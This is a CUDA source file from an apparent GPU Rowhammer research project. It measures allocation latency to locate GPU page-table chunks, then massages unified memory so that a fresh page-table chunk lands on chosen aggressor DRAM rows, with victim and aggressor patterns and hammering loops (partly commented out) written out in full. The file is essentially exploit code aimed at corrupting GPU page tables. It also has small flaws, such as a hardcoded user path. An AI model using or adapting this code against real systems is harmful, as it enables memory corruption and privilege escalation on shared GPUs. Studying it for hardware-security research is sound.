#include <iostream>
#include <cuda.h>
#include <thread>
#include "./sc_firstPTC.cuh"
#include "./sc_allocallmem.cuh"
#include <string>
#include <fstream>
#include <cmath>
#include <numeric>
#include <chrono>
#include <rh_kernels.cuh>
#include <rh_utils.cuh> 
#include <rh_impls.cuh>

const size_t ALLOC_SIZE = 2 * 1024 * 1024;

uint64_t first_PT_chunk_evict(int argc, char *argv[])
{
    const uint64_t num_alloc = std::stoll(argv[0]);
    const double threshold = std::stod(argv[1]);
    const uint64_t skip = std::stoull(argv[2]);

    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    size_t free_byte;
    size_t total_byte;
    auto cuda_status = cudaMemGetInfo(&free_byte, &total_byte);

    if ( cudaSuccess != cuda_status )
    {
        printf("Error: cudaMemGetInfo fails, %s \n", cudaGetErrorString(cuda_status));
        exit(1);
    }

    double maxTimeMS = 0;
    uint64_t max_alloc_chunks = total_byte / ALLOC_SIZE;
    for (uint64_t i = 0; i < max_alloc_chunks; i += 1)
    {
        for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(alloc_ptrs[i] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);

        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;

        if (maxTimeMS == 0)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS && currentMS < threshold)
            maxTimeMS = currentMS;
        else if (currentMS > maxTimeMS)
        {
            std::cout <<  "After \033[1;31m" << i << "\033[0m 2MB Allocations:" << std::endl;
            std::cout << "Normal Latency: " << maxTimeMS << ", Mem Full Latency: " << duration_evict.count() << " ms"<< std::endl;
            std::cin >> maxTimeMS;
            return i + 1;
        }
    }
    return 0;
}

bool first_PT_chunk(int argc, char *argv[])
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const double threshold = std::stod(argv[2]);
    const uint64_t skip = std::stoull(argv[3]);

    return first_PT_chunk(num_alloc_init, num_alloc, threshold, skip);
}

bool first_PT_chunk(uint64_t num_alloc_init, uint64_t num_alloc, double threshold, uint64_t skip)
{
    char **alloc_ptrs = nullptr;

    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        printf("Error: Memory Allocation is wrong\n");
        exit(1);
    }

    char *temp;
    for (uint64_t i = 0; i < num_alloc; i += 1)
    {
        for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
            *(alloc_ptrs[i] + j) = 'a';

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);

        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;
    }
    return true;
}

bool first_PT_chunk_fill(int argc, char *argv[], char ***first_ptc_ptrs, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
{
    const uint64_t num_alloc_init = std::stoll(argv[0]);
    const uint64_t num_alloc = std::stoll(argv[1]);
    const uint64_t alloc_id = std::stoll(argv[2]);
    const double threshold = std::stod(argv[3]);
    const uint64_t skip = std::stoull(argv[4]);

    return first_PT_chunk_fill(num_alloc_init, num_alloc, alloc_id, threshold, skip, first_ptc_ptrs, agg_row_list, agg_vec);
}

/* I should return the newly allocated memory, the aggressor pointer. */
bool first_PT_chunk_fill(uint64_t num_alloc_init, uint64_t num_alloc, uint64_t alloc_id, double threshold, uint64_t skip , char ***first_ptc_ptrs, RowList *agg_row_list, std::vector<uint64_t> *agg_vec)
{
    char **alloc_ptrs = nullptr;
    int timein;
    char **before_chunk_ptrs = (char **)malloc((num_alloc + 1) * sizeof(char*));

    if (alloc_id < 110)
    {
        std::cout << "Error: Memory Allocation is wrong" << "\n";
        exit(1);
    }
    if (!alloc_all_mem(num_alloc_init, threshold, skip, &alloc_ptrs))
    {
        std::cout << "Error: Memory Allocation is wrong" << "\n";
        exit(1);
    }

    uint8_t* layout = (uint8_t *)alloc_ptrs[0];

    const uint64_t num_victim = 23;
    const uint64_t step       = 256;
    const uint64_t it         = 46000;
    const uint64_t min_rowId  = 30329 - 94;
    const uint64_t max_rowId  = 30329 + 5;
    const uint64_t row_step   = 4;
    const uint64_t skip_step  = 4;
    const uint64_t size       = 46L * 1024 * 1024 * 1024;
    const uint64_t n          = 8;
    const uint64_t k          = 3;
    const uint64_t delay      = 55;
    const uint64_t period     = 1;
    const uint64_t count_iter = 10;
    const uint64_t num_rows   = 64100;
    const uint64_t vic_pat    = std::stoull("0x55", nullptr, 16);
    const uint64_t agg_pat    = std::stoull("0xAA", nullptr, 16);
    std::ofstream bitflip_file("~/hammer_out.txt");

    std::ifstream row_set_file("/home/rootuser/gpuhammer-reloaded/gpuhammer/results/row_sets/ROW_SET_A.txt");
    RowList rows = read_row_from_file(row_set_file, layout);
    std::cout << rows.size() << '\n';
    row_set_file.close();

    if ((int64_t)(rows.size() - 2 * num_victim - 1) < 0)
    {
        std::cout << "Error: "
                << "Not enough rows to generate the specified victims." << '\n';
        exit(-1);
    }

    std::cout << "Layout address: " << static_cast<void*>(layout) << '\n';
    std::cout << std::hex;
    std::cout << "Victim pattern: " << vic_pat << '\n';
    std::cout << "Aggressor pattern: " << agg_pat << '\n';
    std::cout << std::dec;

    /* Treat all rows as victim rows */
    std::vector<uint64_t> all_vics(num_rows);
    std::iota(all_vics.begin(), all_vics.end(), 0);
    // set_rows(rows, all_vics, vic_pat, step);
    cudaDeviceSynchronize();

    /* Dummy hammer to keep timing consistent, due to device startup time */
    // start_simple_hammer(rows, all_vics, 1);

    std::vector<int> bitflip_count(std::ceil((max_rowId - min_rowId) / skip_step), 0);

    std::vector<uint64_t> good_agg;
    good_agg = get_aggressors(rows, min_rowId, num_victim + 1, row_step);
    /* Running */
    // for (int i = min_rowId; i < max_rowId; i += skip_step) {

    //     /* Initialize indexes of victims and aggressors */
    //     std::vector<uint64_t> victims = get_sequential_victims(rows, i, num_victim + 2, row_step);
    //     std::vector<uint64_t> aggressors = get_aggressors(rows, i, num_victim + 1, row_step);
        
    //     std::cout << "Chosen Victims:" << vector_str(victims) << std::endl;
    //     std::cout << "Chosen Aggressors:" << vector_str(aggressors) << std::endl;
    //     std::cout << "==========================================================" << std::endl;

    //     for (int j = 0; j < count_iter; j++) {
        
    //     std::cout << "Aggressor Iteration: " << j << std::endl;
    //     auto start_loop = std::chrono::high_resolution_clock::now();

    //     std::vector<uint64_t> pat_vics(110);
    //     std::iota(pat_vics.begin(), pat_vics.end(), victims[0] - 4);

    //     /* Sets the row and evict cache to store it in the memory. */
    //     set_rows(rows, pat_vics, vic_pat, step);
    //     set_rows(rows, aggressors, agg_pat, step);
    //     cudaDeviceSynchronize();

    //     evict_L2cache(layout);
    //     cudaDeviceSynchronize();

    //     auto start_hammer = std::chrono::high_resolution_clock::now();

    //     /* Start the hammering and measure the time */
    //     uint64_t time = start_multi_warp_hammer(rows, aggressors, it, n, k, aggressors.size(), delay, period);
    //     print_time(time);
    //     std::cout << "Average time per round: " << time / it << std::endl;

    //     auto end_hammer = std::chrono::high_resolution_clock::now();

    //     /* Verify result */
    //     evict_L2cache(layout);

    //     // Comment out the first line and uncomment the following line to check 
    //     // for bit-flips in the nearby neighborhood to reduce hammering time.
    //     // bool res = verify_all_content(rows, all_vics, aggressors, step, vic_pat);
    //     bool res = verify_all_content(rows, pat_vics, aggressors, step, vic_pat);
        
    //     std::cout << "Bit-flip in victim rows: " 
    //                             << (res ? "Observed Bit-Flip" : "No Bit-Flip") << std::endl;
    //     if (res){
    //         bitflip_count[std::ceil((i - min_rowId) / skip_step)] ++;
    //         break;
    //     } 

    //     /* Clean up and prepare for next launch*/
    //     cudaDeviceSynchronize();
    //     auto end_loop = std::chrono::high_resolution_clock::now();

    //     std::chrono::duration<double, std::milli> duration_evict = start_hammer - start_loop;
    //     std::chrono::duration<double, std::milli> duration_hammer = end_hammer - start_hammer;
    //     std::chrono::duration<double, std::milli> duration_verify = end_loop - end_hammer;
    //     std::chrono::duration<double, std::milli> duration_total = end_loop - start_loop;
    //     std::cout << "Evict time: " << duration_evict.count() << " ms" << std::endl;
    //     std::cout << "Hammer time: " << duration_hammer.count() << " ms" << std::endl;
    //     std::cout << "Verify time: " << duration_verify.count() << " ms" << std::endl;
    //     std::cout <<"Total time: " << duration_total.count() << " ms" << std::endl;

    //     std::cout <<"==========================================================" << std::endl;
    //     }
    //     if (bitflip_count[std::ceil((i - min_rowId) / skip_step)]){
    //         good_agg = aggressors;
    //         std::cout << "Min Row 2MB id: " << aggressors[0] << ' ' << (void*)rows[aggressors[0]][0] << ' ' << (uint64_t)(rows[aggressors[0]][0] - layout) / (2 * 1024 * 1024) << '\n';
    //         break;
    //     } 
    // }

    char *temp;
    std::cout << (void*)alloc_ptrs[alloc_id]<< '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    /**
     * Rational:
     *  Given PTC is pushed down as you allocate more memory, 
     *  we want to to control where it goes we need to:
     *      1. We can allocate memory sequentially until we are 4MB 
     *          away from the desired position.
     *      2. We start allocating from the end, avoiding to take over that space
     *      3. Before the we made num_alloc allocations, we free up the next 4MB
     *          from step 1.
     *      4. The PTC allocation is then triggered on that piece of memory.
     */
    uint64_t first_hammer_page = static_cast<uint64_t>(rows[good_agg[0]][0] - layout) / (2UL * 1024 * 1024);
    uint64_t last_hammer_page = static_cast<uint64_t>(rows[max_rowId - 5][0] - layout) / (2UL * 1024 * 1024);
    uint16_t to_reserve = last_hammer_page - first_hammer_page;
    std::vector<uint8_t*> hammer_pointers;
    for (uint64_t i = 0; i < num_alloc; i += 1)
    {
        if (num_alloc < alloc_id)
        {  
            if (i >= (num_alloc - to_reserve - 1))
            {
                std::cout << alloc_id  + i - num_alloc << ' ' << (void*) alloc_ptrs[alloc_id  + i - num_alloc] << '\n';
                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                    *(alloc_ptrs[alloc_id  + i - num_alloc] + j) = 'U';
            }
            else
                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                        *(alloc_ptrs[i] + j) = 'U';
            if (i == num_alloc - 1)
            {
                std::cout << alloc_id << ' ' << (void*) alloc_ptrs[alloc_id] << '\n';
                for (int j = 0; j < 2 * 1024 * 1024; j += 4 * 1024)
                    *(alloc_ptrs[alloc_id] + j) = 'U';
            }
        }
        

        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);
        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();


        if (i >= num_alloc - 2)
            initialize_memory_full<<<1,1>>>(temp, 2 * 1024 * 1024);
        if (i >= (num_alloc - to_reserve - 1))
        {
            std::cout << alloc_id - num_alloc + i << '\n';
            hammer_pointers.push_back((uint8_t*)temp);
        }
        cudaDeviceSynchronize();
        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();

        before_chunk_ptrs[i] = temp;
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'U';

        if (i < skip)
            continue;
    }

    std::cout << first_hammer_page << '\n';
    std::cout << last_hammer_page << '\n';
    std::cout << "First PTC Generated " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    /* Free up CPU memory by releasing the evicted memories */
    cudaFree(alloc_ptrs[0]);
    free(alloc_ptrs);

    for (uint64_t i = 0; i < num_alloc - to_reserve - 1; i += 1)
        cudaFree(before_chunk_ptrs[i]);

    std::cout << "Prior Mem Freed " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;


    // if (agg_ptr)
    //     *agg_ptr = before_chunk_ptrs[num_alloc-1];
    // free(before_chunk_ptrs);

    std::cout << std::dec;
    // if (first_ptc_ptrs)
    first_ptc_ptrs = nullptr;
    char** ptc_ptrs = (char **)malloc((num_alloc_init - 50 - to_reserve - 2) * sizeof(char*));
    cudaMallocManaged(&temp, 50UL * 2 * 1024 * 1024);
    for (uint64_t i = 0; i < 50; i += 1)
    {
        initialize_memory<<<1,1>>>(temp + i * 2 * 1024 * 1024, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
    }
    ptc_ptrs[0] = temp;

    for (uint64_t i = 1; i < num_alloc_init - 50 - to_reserve; i += 1)
    {
        // Create Free Space
        cudaMallocManaged(&temp, 2 * 1024 * 1024);
        auto start = std::chrono::high_resolution_clock::now();
        initialize_memory<<<1,1>>>(temp, 2 * 1024 * 1024);
        cudaDeviceSynchronize();
        auto end = std::chrono::high_resolution_clock::now();

        gpuErrchk(cudaPeekAtLastError());
        std::chrono::duration<double, std::milli> duration_evict = end - start;
        double currentMS = duration_evict.count();
        std::cout << i << " New PT time: " << duration_evict.count() << " ms"<< std::endl;

        // if (first_ptc_ptrs)
        //     (*first_ptc_ptrs)[i] = temp;
        // ptc_ptrs[i] = temp;

        // Generate Page Table for 64KB Pages.
        *(temp + 0) = 'a';

        if (i < skip)
            continue;
    }

    std::cout << to_reserve << '\n';
    std::cout << "First PTC Filled " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;

    // auto offset_map = get_relative_aggressor_offset(rows, good_agg, layout);
    // auto row_agg_pair = get_aggressor_rows_from_offset(hammer_pointers, offset_map);
    // set_rows(row_agg_pair.first, row_agg_pair.second, agg_pat, step);
    // cudaDeviceSynchronize();
    // for (int j = 0; j < 100; j++)
    // {
    //     evict_L2cache ((uint8_t *) ptc_ptrs[0]);
    //     cudaDeviceSynchronize ();
    //     /* Start the hammering and measure the time */
    //     uint64_t time = start_multi_warp_hammer (
    //         row_agg_pair.first, row_agg_pair.second, it, n, k, row_agg_pair.second.size (), delay, period);
    // }

    std::cout << "First PTC Filled " << '\n';
    std::cin.clear();
    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
    std::cin >> timein;
    return true;
}
